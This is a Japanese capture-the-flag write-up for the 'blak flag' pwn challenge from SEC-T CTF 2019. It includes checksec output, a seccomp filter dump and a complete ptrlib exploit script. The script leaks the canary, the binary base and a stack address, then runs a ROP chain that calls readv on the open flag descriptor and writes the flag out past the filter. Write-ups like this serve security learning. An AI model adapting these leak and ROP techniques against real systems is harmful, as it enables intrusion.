# [pwn 660pts] blak flag - SEC-T CTF 2019
64ビットバイナリで、Canaryが無効です。
```
$ checksec -f chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      No      0               0       chall
```
原理はよく分かりませんがBuffer OverreadとBuffer Overflowがあります。(IDAで読むと正しそうだけどBOFできる。)
また、起動時にフラグを読み込んでmmapした領域にロードしています。
ということで簡単そうなのですが、関数終了前にseccompを付けています。
```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x15 0x00 0x01 0x00000055  if (A != creat) goto 0022
 0021: 0x06 0x00 0x00 0x00000000  return KILL
 0022: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0024
 0023: 0x06 0x00 0x00 0x00000000  return KILL
 0024: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0026
 0025: 0x06 0x00 0x00 0x00000000  return KILL
 0026: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0028
 0027: 0x06 0x00 0x00 0x00000000  return KILL
 0028: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```
writeは使えるのですが、最初にロードしたフラグはmemzeroで消されています。
readが使えないのが厳しそうですが、フラグのfdはcloseされていないので使えそうです。幸いreadvシステムコールは付けるのでこれを利用しましょう。（ロード時はmmapで読み込んでいるのでseekしなくても良い。）

スタックにreadv用のiovec構造体を用意するのですが、バッファとリークしたスタックアドレスとの差がなぜか実行する度に変わってある程度しか予測できなかったので、たくさんiovecを用意しました。

```
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./chall")
sock = Socket("blakflag-01.pwn.beer", 45243)

def set_rax(val):
    payload  = p64(rop_pop_rdx_rdi_rsi)
    payload += p64(val)
    payload += p64(1)
    payload += p64(proc_base)
    payload += p64(rop_write)
    return payload

# leak canary and proc base
payload = b'A' * 0x98
sock.sendlineafter(": ", payload)
sock.recvline()
canary = u64(b'\x00' + sock.recv(7))
proc_base = u64(sock.recvline()) - 0xf1e
logger.info("canary = " + hex(canary))
logger.info("proc base = " + hex(proc_base))
addr_pflag = proc_base + 0x203000

# leak stack address
payload = b'A' * (0xd0 - 1)
sock.sendlineafter(": ", payload)
sock.recvline()
stack_addr = u64(sock.recvline()) - 0x452
logger.info("stack addr = " + hex(stack_addr))

# prepare rop gadget
rop_pop_rsi = proc_base + 0x00000f95
rop_pop_rdi_rsi = proc_base + 0x00000f94
rop_pop_rdx_rdi_rsi = proc_base + 0x00000f93
rop_syscall = proc_base + 0x00000f50
rop_write = proc_base + 0xf53
logger.info("break *" + hex(proc_base + 0xf1d))

# rop
payload  = b'A' * 8
#_ = input()
payload += (p64(proc_base + 0x203000) + p64(0x400)) * 9
payload += p64(canary)
payload += p64(0)
for i in range(0x10):
    payload += set_rax(19)
    payload += p64(rop_pop_rdx_rdi_rsi)
    payload += p64(1)
    payload += p64(3)
    payload += p64(stack_addr - 0x100 * i)
    payload += p64(rop_syscall)
    payload += p64(rop_pop_rdx_rdi_rsi)
    payload += p64(0x80)
    payload += p64(1)
    payload += p64(proc_base + 0x203000)
    payload += p64(rop_write)

sock.sendlineafter(": ", payload)

sock.interactive()
```

# 感想
sendfileを使えば簡単に解けると聞いたときは虚無になりました。
